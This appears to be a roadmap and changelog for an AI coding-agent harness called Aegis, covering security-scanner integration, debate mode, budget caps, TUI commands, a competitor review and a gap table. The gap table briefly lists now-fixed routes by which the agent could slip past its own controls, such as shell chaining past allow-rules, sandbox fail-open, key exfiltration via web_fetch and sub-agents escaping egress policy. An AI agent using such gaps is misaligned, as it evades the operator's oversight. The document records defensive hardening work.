- **P10.4 (no eval coverage for the delegation seam):** landed as a regression test alongside each P10.1–P10.3 fix rather than a new `internal/eval` scenario — that harness has no natural seam for spawning a _real_ sub-agent through either swarm backend.
- **P10.5 (dollar budget silently no-ops for local models):** prompted by a comparison to how cloud providers budget in tokens, not dollars. `internal/cost` derived USD from a pricing catalog and collapsed to `$0` for local/Ollama (estimated-usage) turns and any uncatalogued model — meaning the local-first deployment case had, in practice, no working spend guardrail. `cost.Tracker` gained `AddTokens`/`TotalTokens` (accumulate regardless of pricing/estimation); new `MaxTokensPerRun`/`session_token_cap`/`daily_token_cap` give a token-denominated primary budget that works everywhere, with the dollar caps remaining a cloud-only convenience layered on top.

Tests: `internal/server/server_subagent_test.go`, `internal/cli/worker_test.go`, `internal/swarm/subprocess_test.go`, `internal/cost/cost_test.go`, `internal/engine/budget_test.go`, `internal/session/session_test.go`, `internal/server/server_test.go`.

</details>

<details>
<summary><strong>P11 — Security Scanning Depth, all 12 items shipped 2026-07-04</strong></summary>

A user request to bring `internal/security`/`aegis scan`/`security_scan` — three host-installed binaries (semgrep `auto`, trivy `fs`, gitleaks) behind one normalized `Finding` model — up to best-in-class OSS coverage across SAST/SCA/container/IaC/DAST. Three structural gaps drove the track: shallow breadth, `Scanner.Available()` silently skipping any tool not on `PATH` (a clean machine reported a clean scan it never ran), and no dynamic (running-app) testing.

- **P11.1 (containerized scanner runtime, keystone):** `Scanner.Resolve` decides host-binary vs. pinned-container-image vs. unavailable — never a silent skip. Ships with **no built-in image pin** by deliberate choice: a scanner image is itself supply-chain surface, and this codebase has no way to verify a _current_ digest at commit time, so an operator pins one themselves (`security.tools.<name>.image`, digest required, see `docs/security.md`'s pin recipe).
- **P11.2 (SARIF-first normalization):** one shared `ParseSARIF` ingester (`internal/security/sarif.go`) replaces per-tool bespoke parsers for every SARIF-emitting scanner; only gitleaks (not SARIF-native) keeps a hand-written one.
- **P11.3 (SAST depth):** opengrep (no-login, no-telemetry community fork) is the new default SAST engine, semgrep selectable; both use pinned rule packs, never `--config auto`. Four opt-in language engines added (gosec/bandit/brakeman/njsscan), which required a real default-enablement mechanism (`ScannerDescriptor.DefaultEnabled`) so opt-in tools don't silently turn themselves on the moment they ship.
- **P11.4 (SCA depth + SBOM):** osv-scanner added as a new SARIF-native SCA scanner; grype's directory scan now prefers matching against a syft-generated CycloneDX SBOM (persisted to `.aegis/sbom.cdx.json`) over its own cataloger, falling back cleanly if syft is unavailable.
- **P11.5 (container image security, scoped):** new `ImageScanner`/`ScanImage` entry point (trivy image, grype, dockle, hadolint). Host-binary only for now — pulling a registry image needs network egress, which the shared container-fallback runner deliberately denies (`--network none`); a network-enabled container path is real, undone follow-up.
- **P11.6 (IaC scanning):** trivy's misconfig scanning made explicit (`--scanners vuln,secret,misconfig`); kubescape added for deeper K8s analysis — not checkov, whose OSS CLI emits no severity and would collapse to INFO in the severity-ranked model.
- **P11.7 (DAST via OWASP ZAP, v1 scope):** runs ZAP's Automation Framework (not the packaged baseline/full/api scripts) since only its `report` job can emit SARIF. Container-only, and target authorization is a **hard, code-enforced gate independent of permission mode**: loopback/RFC-1918 always allowed, anything else needs an explicit allowlist entry, and active/attack modes need a separate `allow_active` opt-in. v1 requires an already-running target; v2 ("build the target + scan it on one ephemeral network") not done.
- **P11.8 (dedup, ASVS mapping, suppression baseline):** `DedupFindings` collapses the same CVE/rule flagged by multiple tools into one finding (tagging every tool that also caught it via `SeenBy`); a curated CWE→OWASP-ASVS table tags a best-effort standards chapter automatically across every SARIF tool with zero per-tool work; an optional `.aegis/security-baseline.yaml` lets an operator suppress a specific accepted-risk finding with a **mandatory expiry** (expired/invalid entries are flagged, never silently honored — a broken baseline fails safe). The `security-audit` skill was extended to use these signals and, when asked to fix rather than review, re-scan after a fix to confirm it closed before claiming success (P4.8's close-the-loop posture applied to security remediation).
- **P11.9 (regression evals + provenance):** a golden-transcript test (`internal/security/regression_test.go`) drives the full pipeline over recorded fixtures with no scanner/network/container needed in CI, proving the P11.8 cross-tool dedup and all three baseline states end to end. Also closed a real gap found while implementing it: a configured scanner image was never actually validated as digest-pinned despite being documented as required — floating tags are now rejected (`digestPinReason`). A live ZAP capture against Juice Shop/WrongSecrets/VAmPI is documented follow-up in `testdata/README.md`, since no container runtime was available to run one this pass.
- **P11.10 (guided scanner install):** approval-gated per-tool install (`aegis security install <tool>`) — shows the exact command and requires confirmation before ever touching the host; supply-chain hygiene favors package managers/checksummed binaries over `curl | sh`.
- **P11.11 (security tool config + `/security-config`):** `security.tools.<name>` config (enabled/method/install/image) plus an interactive TUI form, so none of this requires hand-editing YAML.
- **P11.12 (reachability analysis):** osv-scanner's `--call-analysis` (govulncheck-backed for Go, on by default) surfaces whether a vulnerable dependency's flagged code is actually _called_, not just present in the dependency tree — never inferred for unsupported ecosystems, since a wrong "unreachable" claim would understate real risk.
- **Follow-up, 2026-07-05 — install-from-wizard + `/scan`:** `/security-config` gained an action step per tool (Edit settings / **Install now (guided)** / Back) that runs the same confirmed guided install `aegis security install` does (factored into a shared `security.RunGuidedInstall`), then re-resolves availability so the list reflects the newly-installed binary without leaving the dialog. New `/scan [path|image <ref>|sbom [path]]` TUI command runs a scan directly against the daemon's workspace (`POST /security/scan`, new endpoint) and prints the report — no model turn spent, mirroring `aegis scan`.

**Scope decisions kept deliberately narrow rather than over-built** (each a documented trade-off, not an oversight): no built-in image digest pins (P11.1); image scanning is host-binary only (P11.5); DAST v1 needs an already-running target (P11.7); the ZAP regression fixture is an explicitly labeled synthetic placeholder pending a live capture (P11.9); OWASP Dependency-Check remains opt-in-only with no built integration, no concrete demand yet (P11.4).

Tests: `internal/security/{method,sarif,scanners,sast,sbom,osv,dast,dedup,asvs,baseline,regression,security,install}_test.go`, `internal/cli/security_test.go`, `internal/config/write_security_test.go`, `internal/tui/{securityconfig,scan}_test.go`, `internal/server/scan_test.go`.

</details>

<details>
<summary><strong>P12 — Multi-Agent Debate Mode for Security Analysis, all 7 items shipped 2026-07-05</strong></summary>

A security task (threat model entry, scan-finding triage, design review) can now run as a multi-agent debate — propose → critique → rebut → arbitrate — over Aegis's existing swarm substrate, with one Ollama model instance playing every role via persona-based differentiation (no cast of distinct models required).

- **P12.1 (debate primitive, keystone):** new `internal/debate` package, decoupled from `internal/swarm`/`internal/engine` the same way swarm stays decoupled from the engine. `debate.Run(ctx, claim, Config, RunFunc)` drives up to `MaxRounds` (default 2) rounds of critique → rebuttal against a caller-supplied `RunFunc` (system+user prompt → text), then always closes with an arbiter call over the full transcript, returning a `Transcript` with a parsed `Verdict` (`OUTCOME` + `CONFIDENCE`).
- **P12.2 (debate roles as personas):** two new built-in personas, `security-critic` (adversarial, must cite retrievable evidence — `security_scan`/`grep`/`read_file` file:line — or reply `CONCEDE`) and `security-arbiter` (synthesis-only, minimal `Tools: [remember]`, outputs a fixed `VERDICT/CONFIDENCE/REASON` format). Resolved via `persona.Get(name).System` directly (not `internal/agentdef`) so they're addressable like any other persona (`aegis persona show security-critic`) and overridable per call via `critic_persona`/`arbiter_persona`.
- **P12.3 (evidence grounding):** `debate.hasEvidence` (regex-based citation heuristic — deliberately loose, not a hard verifier) tags each round `[evidence cited]` or `[unsubstantiated]` in the rendered transcript; the arbiter persona is instructed to treat unsubstantiated rounds as noise when reaching a verdict.
- **P12.6 (budget bounds):** `debate.Config` carries an optional shared `*cost.Tracker` plus `BudgetUSD`/`MaxTokens`; `budgetExhausted` (checked before every round, 90% headroom) short-circuits straight to arbitration over whatever transcript exists so far rather than let a debate silently multiply spend across three role-spawns per round the way plain sub-agent fan-out could before P10.3.
- **P12.4 (surfacing):** `agent` tool gained `mode:"debate"` (claim/proposer_persona/critic_persona/arbiter_persona/max_rounds args; depth-guarded, spawns each role via the existing `swarm.Backend`); `POST /debate` HTTP endpoint (session-less — builds a bare `engine.New` per role call rather than reusing the swarm-identity-bearing `subAgentRunner`); TUI `/debate <claim>` slash command; `aegis debate <claim>` headless CLI (mirrors `aegis chat`'s direct adapter/registry/engine construction, one shared cost tracker across role calls).
- **P12.5 (workflow integration, opt-in):** `security.debate.threat_model` / `security.debate.triage` config toggles (both default `false`). When either is on, `effectiveSystem()` injects a small "## Debate mode (P12)" block into the session prompt; the `security-architect` persona's threat-modeling workflow and the `security-audit` skill's triage loop both reference that injected block by name to decide whether to route a threat/finding through `mode:"debate"` before finalizing severity/suppression — keeps the actual gating data-driven (live config) while the instruction text authored in the static persona/skill stays unconditional.
- **P12.7 (eval coverage, scope decision):** followed the P10.4 precedent — `internal/eval` has no natural seam for a Scenario that triggers a real sub-agent spawn (it scripts one engine's adapter, not tool-triggered spawns). Satisfied via regression tests at three levels instead of a new eval scenario: pure mechanism (`internal/debate`), real swarm-spawn path (`internal/tool/builtin`), real HTTP endpoint + engine (`internal/server`).

**Scope decisions kept deliberately narrow:** exactly three roles (proposer/critic/arbiter), no configurable role count; one model instance drives every role via persona system-prompt differentiation, not a multi-model cast; opt-in per task/config only — debate mode is never a silent default for threat modeling or triage.

Tests: `internal/debate/debate_test.go` (6 cases), `internal/tool/builtin/debate_agent_test.go` (5 cases), `internal/server/debate_test.go` (5 cases), `internal/cli/debate_test.go`, `internal/tui/debate_test.go`, plus `internal/persona/persona_test.go` coverage for the two new personas. Docs: `docs/multi-agent.md` (`#debate-p12`), `docs/personas.md`, `docs/cli-reference.md`, `docs/configuration.md`, `docs/security.md`, `CLAUDE.md`.

</details>

<details>
<summary><strong>P14.3 — In-session knowledge base & repo index (`/knowledge`, `/index`), shipped 2026-07-05</strong></summary>

`aegis knowledge index` (P3.3 project knowledge base) and `aegis index` (P2.3 repo map) were
CLI-only; the model already had `project_knowledge` and the injected `<repo_map>` block, but a user
driving the TUI had no way to trigger a rebuild or run a search without shelling out. Unlike
`/security`/`/sandbox` (which read the TUI process's own config/workspace directly, no daemon round
trip), `/knowledge` and `/index` go **through the daemon**: `s.knowledge` is one live `*knowledge.Store`
instance for the workspace (`sql.DB.SetMaxOpenConns(1)`), and a second connection opened directly from
the TUI process risks lock contention with the daemon's writer and can't refresh the daemon's cached
`<repo_map>` system-prompt block anyway — so both commands follow the `/scan`/`/debate` precedent
(daemon HTTP round trip) instead.

- New `POST /knowledge` (`api.KnowledgeRequest{Action: "index"|"query", Query, Limit}` →
  `api.KnowledgeResponse`): `"index"` calls `s.knowledge.Index` (same as `aegis knowledge index`) and
  returns `doc_count`/`db_path`/`embeddings_enabled`; `"query"` calls `s.knowledge.Search` (same as the
  `project_knowledge` tool) and returns the matched `path`/`title`/`snippet`/`score` results. 503 when
  `s.knowledge` is nil (store failed to open at startup); 400 for a missing query or an unrecognized
  action.
- New `POST /repomap/index` (`api.RepoMapIndexResponse{FileCount, Path}`): rebuilds via
  `repomap.Build(s.workspace, ...)`, saves the `.aegis/repomap.json` cache (same as `aegis index`), and
  — the part a bare CLI-equivalent handler wouldn't do — replaces the daemon's own cached
  `s.repoMap` under a new `repoMapMu` mutex, so the very next turn's system prompt picks up the
  refreshed map with no restart. `s.repoMap` had been a write-once-at-startup field read without
  synchronization; making it rebuildable at runtime turned it into genuinely shared mutable state, so
  `effectiveSystem`'s read was moved under the same mutex (mirroring the existing `permMu` pattern for
  `permRules`).
- `client.Client.Knowledge`/`RepoMapIndex` (`internal/client/client.go`) mirror `Scan`/`Debate`.
- `/knowledge [index|query <text>]` and `/index` (`internal/tui/slash.go`'s `cmdKnowledge`/`cmdIndex`)
  registered as two new `commandDef` entries (P14.10) — dispatch, `/help`, and the completion popup all
  picked them up automatically.
- Tests: `internal/server/knowledge_test.go` (index-then-query round trip against a real store proves
  an indexed README becomes searchable; missing-query and unknown-action rejection; 503 without a
  store; repomap rebuild proves both the on-disk cache and `effectiveSystem`'s output change), plus
  `internal/tui/knowledge_test.go` for the argument-validation fast paths that return before touching
  the client (bare `/knowledge`, `/knowledge query` with no text, unknown subcommand) — same
  division of labor as `scan_test.go`/`debate_test.go` (TUI tests cover argument parsing; the server
  package covers the actual daemon round trip).
- Verified manually end-to-end: started a real daemon against a scratch git repo with a README and a
  `.go` file, hit `/knowledge` (index → 9 docs, query "frobnication" → 1 match) and `/repomap/index`
  (2 files) over HTTP with the daemon's real bearer token, confirmed `.aegis/repomap.json` was written.
- P14.4, P14.6, P14.7, P14.8, and P14.9 all shipped 2026-07-06, closing out the P14 track (see their entries under P14 above).

</details>

<details>
<summary><strong>P14.1 + P14.10 — command-surface drift fix and its structural cure, shipped 2026-07-05</strong></summary>

Found during a cross-feature integration review (roadmap + codebase, focused on seams between
features rather than per-feature gaps) — the review's own hypothesis, that retrofitted capabilities
reliably miss one of several shared integration seams, was confirmed by this exact bug.

- **P14.1 (completion/palette drift):** `internal/tui/completion.go`'s `builtinCommands` (the
  completion-popup/command-palette source) was missing seven commands that were fully dispatchable
  via `d.builtins` and listed in `/help`: `security-config`, `scan`, `debate`, `rollback`, `detach`,
  `archive`, `humor`. `help_test.go` already guarded `d.builtins` against `/help`, but nothing
  guarded `builtinCommands` against either — so typing `/sec` surfaced nothing, which is why
  `/security-config` read as "not existing" to a user driving the TUI. Fixed by adding the seven
  entries (and to `commandsNeedingArgs`, where a trailing space helps); new guard test
  `TestBuiltinCommandsCoverDispatchTable` (`internal/tui/completion_test.go`) asserts
  `builtinCommands` covers every `d.builtins` key except the `quit` alias, mirroring the existing
  `TestSlashCommandsAreListedInHelp`.
- **P14.10 (structural cure, built same day rather than deferred):** new `internal/tui/commands.go`
  defines each built-in command exactly once as a `commandDef` (name, arg hint, short description,
  detailed help, `needsArgs`, and its handler as a method expression `(*SlashDispatcher).cmdX`).
  `NewSlashDispatcher`'s `d.builtins`, `cmdHelp`'s general listing, `builtinHelp`'s detailed
  `/help <name>` text, and `completion.go`'s `builtinCommands`/`commandsNeedingArgs` are all now
  derived from this one table (`commandDefs()`) instead of four independently hand-maintained
  lists — closing the entire drift class P14.1 fixed one instance of. `commandDefs` is a function,
  not a package-level `var`: a `var` whose initializer holds handler values that themselves range
  over that `var` is a genuine Go compile-time initialization cycle (dependency analysis follows
  through function bodies referenced in the initializer), so the table is rebuilt per lookup
  instead — negligible cost at ~26 entries, called only at dispatcher construction, `/help`, and
  popup population. New test `TestCommandDefsWellFormed` guards the table itself (no empty or
  duplicate names, every entry has a handler and both help strings).
- Tests: `internal/tui/completion_test.go` (`TestBuiltinCommandsCoverDispatchTable`,
  `TestCommandDefsWellFormed`), full existing `internal/tui` suite (`help_test.go`,
  `completion_test.go`) re-verified green against the refactor.

</details>

<details>
<summary><strong>Debate daily cost/token cap integration, shipped 2026-07-05</strong></summary>

A second instance of the same "new capability skips a shared seam" pattern P14.1 exemplified,
found by checking whether P12 (debate, shipped 2026-07-05) actually integrated with the P9.5/P10.5
cost-guardrail track (shipped 2026-07-03) rather than assuming shipped-and-tested meant
fully-integrated. It didn't: `handleDebate` (`internal/server/server.go`) built its own bare
`debate.Config`/tracker and only enforced the per-run `BudgetUSD`/`MaxTokensPerRun` — the
cross-session daily dollar and token caps (`Cost.DailyCapUSD`/`DailyTokenCap`) and the ledger writes
that make them work (`store.AddDailyCost`/`AddDailyTokens`) lived entirely inside
`handlePostMessage`, debate's sibling endpoint, and were never called from the debate path.
Consequences before the fix: a `/debate` call (up to ~7 model calls per run: proposer + critic/
rebuttal per round + arbiter) ran even with the daily cap already exhausted, its spend was invisible
to every later cap check (including the next normal session turn's), and — the case this matters
most for — the P10.5 token cap (the only *working* guardrail for local/Ollama models, where dollar
cost is $0) was bypassed entirely for debate runs.

- Extracted `(s *Server) checkDailyCaps(ctx) (dailyCostBefore, dailyTokensBefore, err)` and
  `(s *Server) recordDailySpend(costUSD, tokens)` out of `handlePostMessage`'s previously inlined
  daily-cap check/ledger-write logic (behavior unchanged there — same read-failure-is-non-fatal
  semantics, same "only write if a cap is configured" gating).
- `handleDebate` now calls `checkDailyCaps` before starting (refusing with 402 if either cap is
  already reached — no session cap applies, since debate is deliberately session-less) and
  `recordDailySpend(tracker.TotalUSD(), tracker.TotalTokens())` after `debate.Run` returns,
  unconditionally (even on error), since `debate.Run` returns the partial transcript — and whatever
  the tracker accumulated — before failing.
- Tests: `internal/server/debate_test.go` — `TestHandleDebateBlockedByDailyCostCap` (daily cap
  already exhausted refuses the call), `TestHandleDebateRecordsDailySpend` (a successful debate's
  cost lands in the same daily ledger a normal turn writes to, provable via `store.TodayCost`).
  Full existing `internal/server` cost-cap suite (`TestSessionCostCapBlocksTurn`,
  `TestDailyCostCapBlocksTurn`, `TestSessionTokenCapBlocksTurn`, `TestDailyTokenCapBlocksTurn`,
  `TestCostAlertThresholdFires`) re-verified green against the refactor.
- Not yet done, left as a natural follow-up rather than scope creep here: any *future* model-
  spending endpoint must remember to call these two helpers itself — there's no compiler-enforced
  guarantee the way P14.10 enforces the command-surface table, since Go has no "all HTTP handlers
  that call `engine.Run` must call X" constraint. Worth a comment at the routing table
  (`server.routes()`) flagging this the next time a spending endpoint is added.

</details>

<details>
<summary><strong>Misc audit notes</strong></summary>

- **P7 audit — reviewed and found sound, no action needed:** SSRF dialer (private-IP check happens at dial time, closing the DNS-rebind window); path traversal / symlink handling in `ValidatePath`; local daemon HTTP API (constant-time bearer token + loopback-origin check); persona YAML parsing (safe library, no unsafe type deserialization); `team_tasks` claim path (properly transactional, no duplicate-claim race).
- **2026-07-03 documentation audit:** cross-checked every P7.1–P7.7 and TQ-track "shipped" claim against the actual code (all confirmed; only P8's cited line numbers had minor drift, now corrected) and re-read `docs/*.md` against current behavior. Found and fixed real staleness: `docs/tui-guide.md`/`docs/permissions.md` still described the pre-TQ6 y/n/a approval banner instead of the current option-list dialog; the keyboard shortcut table was missing `Alt+Enter`/`Shift+Enter`/`Ctrl+O`/`Ctrl+X` and a correct `Esc` row; `docs/configuration.md`'s `tui:` block was missing the `theme` key entirely; the `Ctrl+X` embedded terminal pane (pre-existing) had never been documented. All fixed in place.

</details>

---

## Appendix B — 2026-07 Landscape Review

What changed in the top-tier harnesses since the 2026-06-29 competitive analysis, and what it means for Aegis.

**Claude Code** (the closest architectural relative):

- **Agent Teams** (Feb 2026, with Opus 4.6) — peer sessions that message each other directly, claim tasks from a shared task list, and challenge each other's findings. Distinct from subagents (which report up to a parent). Aegis's swarm mailbox was the right substrate; P5.1 added the shared task list and peer messaging semantics.
- **Skills with progressive disclosure** — only skill _name + description_ load at session start; the full body loads on invocation. Addressed by P4.3.
- **Lifecycle hooks as user config** — shell commands / HTTP endpoints / LLM prompts firing on `PreToolUse`, `PostToolUse`, `Stop`, `SubagentStop`, `SessionStart`, `Notification`; exit code 2 vetoes a tool call. Addressed by P4.4.
- **Deferred tools / ToolSearch** — tool schemas lazy-loaded via a search meta-tool instead of shipping every schema every turn. Addressed by P4.6.
- **Dispatch & Channels** — programmatic task submission via API plus event streams for dashboards/alerting. No Aegis equivalent; not scheduled.
- **Background agents finish the job** — commit, push, and open a draft PR when code work completes in a worktree. Addressed by P4.8.

**opencode** — 75+ providers via Models.dev; TypeScript plugin system with 25+ lifecycle hooks; experimental LSP _tool_ (go-to-definition, references, hover, call hierarchy — addressed by P5.2); session share links; desktop app + IDE extension (relates to open P6.5).

**Codex CLI** — default-on sandboxing (container, plus OS-level seatbelt/Landlock when no container — addressed by P4.7); headline **token efficiency** (~4× fewer tokens than peers on Terminal-Bench — related to open P6.4/context-editing work, now shipped); runs as an MCP _server_ (relates to open P6.3); native GitHub Actions + auto-PR; Rust rewrite.

**Gemini CLI** — 1M context standard; Google Search grounding; 90+ extensions; subagents with parallel delegation (Apr 2026); being folded into the Antigravity platform.

**Convergent themes across all four:** (1) token efficiency as a first-class metric, (2) user-configurable lifecycle hooks, (3) lazy/progressive context loading (skills, tools, docs), (4) headless/programmatic operation with structured output, (5) forge integration that completes the loop (PR out the other end), (6) sandboxing that doesn't require Docker. Aegis has now closed all six — MCP-server interop shipped 2026-07-05 (P6.3); A2A (P6.2) was evaluated and declined the same day (no consumer, extra protocol surface for no current benefit).

**Where Aegis was already at or ahead of parity** (no action needed): prompt-cache breakpoints in the Anthropic adapter; per-turn structured traces + cost budget enforcement; checkpoints/rewind + git rollback; output validation guard (LLM rubric + schema modes); cron scheduling; container sandbox matrix (Docker/Podman/WSL/Apple); ACP editor protocol; local-LLM-first provider posture; 17 security personas + contextual security policies (egress-then-write); audit trail.

---

## Appendix C — Gap Analysis

| #   | Category           | Gap                                                                                                                                                                                | Present in                                | Severity     | Status                                        |
| --- | ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------- | ------------ | --------------------------------------------- |
| 1   | Context efficiency | Skills fully injected into system prompt (no progressive disclosure)                                                                                                               | Claude Code                               | High         | ✅ P4.3                                       |
| 2   | Extensibility      | No user-configurable lifecycle hooks                                                                                                                                               | Claude Code, opencode                     | High         | ✅ P4.4                                       |
| 3   | Context efficiency | All 39+ tool schemas sent every turn; no deferred tool loading                                                                                                                     | Claude Code (ToolSearch)                  | High         | ✅ P4.6                                       |
| 4   | Automation         | Headless `aegis chat` emits plain text only                                                                                                                                        | Claude Code, Codex                        | High         | ✅ P4.5                                       |
| 5   | Safety             | Local sandbox backend = no isolation                                                                                                                                               | Codex CLI (default-on)                    | High         | ✅ P4.7                                       |
| 6   | Workflow           | Git tool stops at commit; no push / PR creation                                                                                                                                    | Claude Code, Codex                        | High         | ✅ P4.8                                       |
| 7   | Multi-agent        | Subagents report up only; no shared task list or peer messaging                                                                                                                    | Claude Code Agent Teams                   | Medium       | ✅ P5.1                                       |
| 8   | Tools              | LSP tools = diagnostics + references only                                                                                                                                          | opencode                                  | Medium       | ✅ P5.2                                       |
| 9   | Tools              | Web search scrapes DuckDuckGo HTML                                                                                                                                                 | Gemini, Claude Code                       | Medium       | ✅ P5.3                                       |
| 10  | Automation         | No notification channel for detached sessions                                                                                                                                      | Claude Code, Channels                     | Medium       | ✅ P5.4                                       |
| 11  | TUI                | No `@file#start-end` line-range syntax                                                                                                                                             | opencode                                  | Low          | ✅ P5.5                                       |
| 12  | TUI                | No draft stash across sessions                                                                                                                                                     | opencode                                  | Low          | ✅ P5.6                                       |
| 13  | Persistence        | No mid-turn state persistence on crash                                                                                                                                             | Crush, opencode                           | Low          | ⬜ P6.1                                       |
| 14  | Interop            | Cannot act as an MCP server (A2A protocol evaluated and declined 2026-07-05 — no consumer)                                                                                         | ADK, Codex                                | Low          | ✅ P6.3                                       |
| 15  | Extensibility      | Bundles install from local path only                                                                                                                                               | opencode plugin ecosystem                 | Low          | ✅ P5.7                                       |
| 16  | Memory             | Knowledge/longmem retrieval is BM25-only                                                                                                                                           | Cursor, Devin                             | Low          | ✅ P5.8                                       |
| 17  | Reliability        | No provider failover                                                                                                                                                               | Aider (litellm routing)                   | Low          | ✅ P5.9                                       |
| —   | Context efficiency | No deterministic tool-result pruning before LLM compaction                                                                                                                         | Codex CLI (token efficiency)              | Low          | ✅ P6.4                                       |
| 18  | Security           | MCP tools hardcode capability as `network`, bypassing permission gate in any mode                                                                                                  | — (internal audit)                        | **Critical** | ✅ P7.1                                       |
| 19  | Security           | Shell exec inherits full env (API keys); web_fetch enables exfil to public hosts                                                                                                   | — (internal audit)                        | High         | ✅ P7.2                                       |
| 20  | Security           | Permission allow-rule glob matches whole command string, bypassed by shell chaining                                                                                                | — (internal audit)                        | High         | ✅ P7.3                                       |
| 21  | Security           | Sandbox backend silently fails open to unsandboxed exec                                                                                                                            | — (internal audit)                        | Medium       | ✅ P7.4                                       |
| 22  | Security           | Bundle persona can silently escalate session to `auto` mode                                                                                                                        | — (internal audit)                        | Medium       | ✅ P7.5                                       |
| 23  | Security           | No signature/checksum verification on git-URL bundle installs                                                                                                                      | opencode plugin registry                  | Medium       | ✅ P7.6                                       |
| 24  | Security           | Deny rules silently no-op for tools with non-standard argument fields                                                                                                              | — (internal audit)                        | Low          | ✅ P7.7                                       |
| 25  | Performance        | Session store rewrites entire message/trace blob every turn — O(N²) over session life                                                                                              | — (internal audit)                        | High         | ✅ P8.1                                       |
| 26  | Performance        | Knowledge semantic search loads full corpus (vectors + bodies) per query                                                                                                           | — (internal audit)                        | Medium       | ✅ P8.2                                       |
| 27  | Performance        | Swarm mailbox has no eviction, grows unbounded                                                                                                                                     | — (internal audit)                        | Medium       | ✅ P8.3                                       |
| 28  | Performance        | Token estimation double-scans full conversation per turn (local models)                                                                                                            | — (internal audit)                        | Medium       | ✅ P8.4                                       |
| 29  | Performance        | Memory relevance TF-IDF recomputed from scratch every call                                                                                                                         | — (internal audit)                        | Low-Med      | ✅ P8.5                                       |
| 30  | Performance        | Write/execute tool calls unnecessarily serialize concurrent reads                                                                                                                  | — (internal audit)                        | Low          | ✅ P8.6                                       |
| 31  | Quality            | No agent-behavior eval/regression harness                                                                                                                                          | Codex, Claude Code (internal eval suites) | Medium       | ✅ P9.1                                       |
| 32  | Quality            | Zero test coverage in trace/logging/api/client packages                                                                                                                            | — (internal audit)                        | Medium       | ✅ P9.2                                       |
| 33  | Security           | In-process sub-agents bypass parent's contextual egress policy + text allow/deny rules (only mode is inherited)                                                                    | — (service-interaction review)            | **High**     | ✅ P10.1                                      |
| 34  | Security           | Subprocess workers run the shell tool with no sandbox and a re-injected API-key env                                                                                                | — (service-interaction review)            | **High**     | ✅ P10.2                                      |
| 35  | Security           | Subprocess fan-out gets a fresh full BudgetUSD per worker (shared ledger can't cross process boundary)                                                                             | — (service-interaction review)            | Medium       | ✅ P10.3                                      |
| 36  | Quality            | No eval scenario asserts a parent's deny/egress/budget still binds a spawned sub-agent                                                                                             | — (service-interaction review)            | Medium       | ✅ P10.4                                      |
| 37  | Safety             | Dollar-denominated budget/caps are a silent no-op for local (estimated-usage) + uncatalogued models — no working spend guardrail in the default local posture                      | — (provider-budgeting comparison)         | **High**     | ✅ P10.5                                      |
| 38  | Security scanning  | `Scanner.Available()` gates on a host binary; a clean machine silently skips every scanner and reports a scan it never ran                                                         | — (scan review)                           | High         | ✅ P11.1                                      |
| 39  | Security scanning  | Container-image security entirely missing (`trivy fs` only, never `trivy image`/grype/hadolint/dockle)                                                                             | — (scan review)                           | Medium       | ✅ P11.5 (scoped: host-binary only)           |
| 40  | Security scanning  | IaC coverage shallow — trivy config not fully exercised; deeper engine wanted (trivy expanded, not checkov: checkov OSS has no severity)                                           | — (scan review)                           | Medium       | ✅ P11.6                                      |
| 41  | Security scanning  | No DAST capability; OWASP ZAP automation requested (containerized, authorization-gated)                                                                                            | user request                              | High         | ✅ P11.7 (v1 scope)                           |
| 42  | Security scanning  | Single SAST engine (semgrep `auto`, unpinned)                                                                                                                                      | — (scan review)                           | Medium       | ✅ P11.3                                      |
| 43  | Security scanning  | No way to install a missing scanner (or auto-pick host-binary vs container); missing tools silently skipped                                                                        | user request                              | High         | ✅ P11.10                                     |
| 44  | Security scanning  | No user configuration for which security tools to enable, run method (host/container/auto), or auto-install policy                                                                | user request                              | High         | ✅ P11.11 (CLI + `/security-config` TUI form) |
| 45  | Security scanning  | No SCA breadth beyond trivy (osv-scanner/grype) or SBOM generation                                                                                                                 | — (scan review)                           | Medium       | ✅ P11.4                                      |
| 46  | Security scanning  | SCA findings carry no reachability signal — a vulnerable _package_ present reads the same as a vulnerable _function_ actually called                                               | user request                              | Medium       | ✅ P11.12                                     |
| 47  | Security scanning  | Overlapping tools re-report the same finding; no accepted-risk allowlist; findings read as raw tool IDs with no recognized-standard mapping                                        | — (scan review)                           | Medium       | ✅ P11.8                                      |
| 48  | Security scanning  | No regression coverage over recorded scanner output; a configured `security.tools.<name>.image` was never actually validated as digest-pinned despite being documented as required | — (scan review)                           | Medium       | ✅ P11.9                                      |

---

## Appendix D — Sources (2026-07-02 review)

- [Claude Code changelog](https://code.claude.com/docs/en/changelog) · [Steering Claude Code: skills, hooks, subagents](https://claude.com/blog/steering-claude-code-skills-hooks-rules-subagents-and-more) · [Agent Teams / subagents guide](https://saascity.io/blog/claude-code-subagents-agent-teams-2026) · [Q1 2026 update roundup](https://www.mindstudio.ai/blog/claude-code-q1-2026-update-roundup)
- [opencode docs](https://opencode.ai/docs/) · [opencode LSP servers](https://opencode.ai/docs/lsp/) · [opencode internals deep-dive](https://cefboud.com/posts/coding-agents-internals-opencode-deepdive/)
- [Claude Code vs Codex vs Gemini CLI (2026)](https://www.deployhq.com/blog/comparing-claude-code-openai-codex-and-google-gemini-cli-which-ai-coding-assistant-is-right-for-your-deployment-workflow) · [System prompts compared](https://codex.danielvaughan.com/2026/04/19/system-prompts-compared-codex-gemini-claude-code/) · [Agent capabilities compared](https://www.aimadetools.com/blog/claude-code-vs-codex-vs-gemini-agents-2026/)
